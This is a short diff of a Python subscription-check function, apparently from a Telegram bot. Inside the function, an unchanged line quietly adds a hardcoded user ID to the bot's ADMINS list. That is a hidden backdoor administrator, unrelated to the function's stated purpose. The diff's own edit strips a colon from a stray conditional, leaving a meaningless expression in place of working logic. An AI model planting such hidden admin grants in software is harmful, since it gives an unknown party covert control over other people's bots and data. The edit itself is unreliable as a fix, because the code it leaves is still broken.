@@ -54,7 +54,7 @@ async def is_subscribed(bot, query=None, userid=None):
 
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
-    userid == None and query != None:
+    userid == None and query != None
     
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
